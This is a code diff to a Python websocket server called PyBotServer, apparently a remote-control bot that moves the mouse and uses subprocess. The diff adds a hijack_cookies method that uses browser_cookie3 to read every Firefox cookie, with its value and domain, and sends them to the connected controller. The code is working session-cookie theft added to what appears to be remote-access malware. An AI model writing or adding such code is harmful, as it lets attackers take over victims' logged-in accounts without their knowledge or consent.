@@ -4,6 +4,7 @@ import websockets
 import json
 import subprocess
 import logging
+import browser_cookie3
 
 logging.basicConfig(level=logging.INFO)
 
@@ -29,6 +30,15 @@ class PyBotServer:
             response = {"status": status, "message": message}
             await self.__websocket.send(json.dumps(response))
             logging.info(f"Sent response: {response}")
+
+    async def hijack_cookies(self):
+        try:
+            cookies = browser_cookie3.firefox()
+            cookie_dict = {cookie.name: {'value': cookie.value, 'domain': cookie.domain} for cookie in cookies}
+            await self.send_response("succsess", json.dumps(cookie_dict))
+        except Exception as e:
+            await self.send_response("error", f"Failed to hijack cookies. Error: {str(e)}")
+
 
     async def move_mouse(self, data):
         x = data.get('x')
